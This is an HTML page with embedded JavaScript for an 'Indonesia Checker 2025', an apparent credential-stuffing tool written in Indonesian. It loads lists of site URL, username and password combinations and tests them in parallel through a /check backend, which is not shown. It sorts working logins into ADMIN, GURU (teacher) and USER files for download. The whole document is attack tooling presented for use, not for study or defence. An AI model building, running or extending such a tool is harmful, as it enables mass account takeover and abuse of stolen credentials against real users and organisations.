<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INDONESIA CHECKER 2025 — HTML EDITION</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono&display=swap');
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #00ff00;
            font-family: 'Roboto Mono', monospace;
            margin: 0; padding: 0;
            overflow-x: hidden;
        }
        .container {
            max-width: 1200px; margin: 20px auto; padding: 20px;
            background: rgba(0,0,0,0.8);
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
            border: 1px solid #00ff00;
        }
        h1 {
            text-align: center;
            font-family: 'Orbitron', sans-serif;
            color: #00ff41;
            text-shadow: 0 0 20px #00ff41;
            font-size: 2.8em;
        }
        .drop-zone {
            border: 3px dashed #00ff00;
            border-radius: 15px;
            padding: 40px;
            text-align: center;
            background: rgba(0,255,0,0.05);
            transition: all 0.3s;
            margin: 20px 0;
            cursor: pointer;
        }
        .drop-zone:hover { background: rgba(0,255,0,0.15); }
        .drop-zone.dragover { background: rgba(0,255,0,0.3); border-color: #ff00ff; }
        
        textarea {
            width: 100%; height: 200px; background: #000; color: #0f0; border: 1px solid #0f0;
            padding: 15px; border-radius: 10px; font-family: 'Courier New'; font-size: 14px;
        }
        button {
            padding: 15px 40px; font-size: 1.5em; background: #000; color: #00ff00;
            border: 2px solid #00ff00; border-radius: 10px; cursor: pointer;
            margin: 10px; transition: all 0.3s;
            font-weight: bold;
        }
        button:hover { background: #00ff00; color: #000; box-shadow: 0 0 20px #00ff00; }
        button#stop { background: #330000; border-color: #ff0000; color: #ff0000; }
        button#stop:hover { background: #ff0000; color: #fff; }

        .stats {
            display: flex; justify-content: space-around; margin: 20px 0; font-size: 1.3em;
            background: rgba(0,0,0,0.6); padding: 15px; border-radius: 10px;
        }
        .stats div { text-align: center; }
        .live { color: #00ff00; }
        .die { color: #ff0000; }
        .progress { width: 100%; height: 30px; background: #000; border: 2px solid #00ff00; border-radius: 15px; overflow: hidden; margin: 20px 0; }
        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #00ff00, #00ff88); transition: width 0.4s; }

        .results {
            background: #000; border: 1px solid #333; padding: 15px; height: 400px; overflow-y: auto;
            border-radius: 10px; font-size: 13px; margin-top: 20px;
        }
        .result-live { color: #00ff00; }
        .result-die { color: #ff0066; }
        .result-admin { color: #ff00ff; font-weight: bold; }
        .result-guru { color: #00ffff; }
    </style>
</head>
<body>
    <div class="container">
        <h1>INDONESIA CHECKER 2025</h1>
        <p style="text-align:center; color:#00ff88;">HTML EDITION — NO INSTALL • DRAG & DROP • AUTO SAVE</p>

        <div class="drop-zone" id="dropZone">
            <h2>Drag & Drop List di Sini</h2>
            <p>atau klik untuk pilih file</p>
            <input type="file" id="fileInput" style="display:none;" accept=".txt">
        </div>

        <center>
            <button onclick="startChecking()">START CHECKER</button>
            <button id="stop" onclick="stopChecking()">STOP</button>
            <button onclick="clearResults()">CLEAR</button>
        </center>

        <div class="stats">
            <div>Total: <span id="total">0</span></div>
            <div class="live">LIVE: <span id="live">0</span></div>
            <div class="die">DIE: <span id="die">0</span></div>
            <div>Thread: <input type="number" id="thread" value="30" min="10" max="100" style="width:60px;background:#000;color:#0f0;border:1px solid #0f0;"></div>
        </div>

        <div class="progress"><div class="progress-bar" id="progressBar"></div></div>

        <div class="results" id="results"></div>

        <center style="margin-top:20px;">
            <button onclick="downloadResults('LIVE_ADMIN.txt')">Download ADMIN</button>
            <button onclick="downloadResults('LIVE_GURU.txt')">Download GURU</button>
            <button onclick="downloadResults('LIVE_USER.txt')">Download USER</button>
            <button onclick="downloadAll()">Download SEMUA</button>
        </center>
    </div>

    <script>
        let lists = [], running = false, stopped = false;
        let liveCount = 0, dieCount = 0;
        let liveAdmin = [], liveGuru = [], liveUser = [];

        const resultsDiv = document.getElementById('results');
        const dropZone = document.getElementById('dropZone');

        dropZone.onclick = () => document.getElementById('fileInput').click();
        document.getElementById('fileInput').onchange = e => handleFile(e.target.files[0]);

        dropZone.ondragover = e => { e.preventDefault(); dropZone.classList.add('dragover'); };
        dropZone.ondragleave = () => dropZone.classList.remove('dragover');
        dropZone.ondrop = e => {
            e.preventDefault();
            dropZone.classList.remove('dragover');
            if (e.dataTransfer.files[0]) handleFile(e.dataTransfer.files[0]);
        };

        function handleFile(file) {
            const reader = new FileReader();
            reader.onload = ev => {
                const text = ev.target.result;
                lists = text.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#') && (l.includes(':') || l.includes('|')));
                document.getElementById('total').textContent = lists.length;
                addResult(`<span style="color:#00ffff;">[+] Loaded ${lists.length} akun</span>`);
            };
            reader.readAsText(file);
        }

        function addResult(text) {
            const div = document.createElement('div');
            div.innerHTML = text;
            resultsDiv.appendChild(div);
            resultsDiv.scrollTop = resultsDiv.scrollHeight;
        }

        function downloadResults(filename) {
            let content = '';
            if (filename.includes('ADMIN')) content = liveAdmin.join('\n');
            if (filename.includes('GURU')) content = liveGuru.join('\n');
            if (filename.includes('USER')) content = liveUser.join('\n');
            if (!content) return alert('Kosong bro!');
            const blob = new Blob([content], {type: 'text/plain'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = filename;
            a.click();
        }

        function downloadAll() {
            downloadResults('LIVE_ADMIN.txt');
            downloadResults('LIVE_GURU.txt');
            downloadResults('LIVE_USER.txt');
        }

        function clearResults() {
            resultsDiv.innerHTML = '';
            liveAdmin = []; liveGuru = []; liveUser = [];
            liveCount = dieCount = 0;
            document.getElementById('live').textContent = '0';
            document.getElementById('die').textContent = '0';
        }

        function stopChecking() { stopped = true; running = false; }

        async function startChecking() {
            if (running || lists.length === 0) return;
            running = true; stopped = false;
            liveCount = dieCount = 0;
            document.getElementById('live').textContent = '0';
            document.getElementById('die').textContent = '0';

            const thread = parseInt(document.getElementById('thread').value) || 30;
            const chunkSize = Math.ceil(lists.length / thread);
            const chunks = [];
            for (let i = 0; i < lists.length; i += chunkSize) chunks.push(lists.slice(i, i + chunkSize));

            let completed = 0;
            for (const chunk of chunks) {
                if (stopped) break;
                await Promise.all(chunk.map(line => checkAccount(line)));
                completed += chunk.length;
                document.getElementById('progressBar').style.width = (completed / lists.length * 100) + '%';
            }
            running = false;
            addResult(`<span style="color:#ff00ff;">[FINISH] Total LIVE: \( {liveCount} | ADMIN: \){liveAdmin.length} | GURU: \( {liveGuru.length} | USER: \){liveUser.length}</span>`);
        }

        async function checkAccount(line) {
            if (stopped) return;
            let [url, user, pass] = [null, null, null];

            // Parse semua format
            if (line.includes('|')) {
                const p = line.split('|');
                url = p[0].trim(); user = p[1].trim(); pass = p[2].trim();
            } else if (line.includes(':')) {
                const p = line.split(':');
                url = p[0].trim(); user = p[1].trim(); pass = p.slice(2).join(':');
            }
            if (!url || !user || !pass) return;

            if (!url.startsWith('http')) url = 'https://' + url;
            url = url.replace(/\/+$/, '');

            try {
                const res = await fetch('/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url, user, pass})
                });
                const result = await res.json();

                if (result.status === 'LIVE') {
                    liveCount++;
                    document.getElementById('live').textContent = liveCount;

                    let type = 'USER';
                    if (result.role === 'ADMIN') { type = 'ADMIN'; liveAdmin.push(line); }
                    else if (result.role === 'GURU') { type = 'GURU'; liveGuru.push(line); }
                    else { liveUser.push(line); }

                    addResult(`<span class="result-live result-\( {type.toLowerCase()}">[LIVE \){type}] ${line}</span>`);
                } else {
                    dieCount++;
                    document.getElementById('die').textContent = dieCount;
                    addResult(`<span class="result-die">[DIE] ${line}</span>`);
                }
            } catch (e) {
                dieCount++;
                document.getElementById('die').textContent = dieCount;
                addResult(`<span class="result-die">[ERROR] ${line}</span>`);
            }
        }
    </script>
</body>
</html>
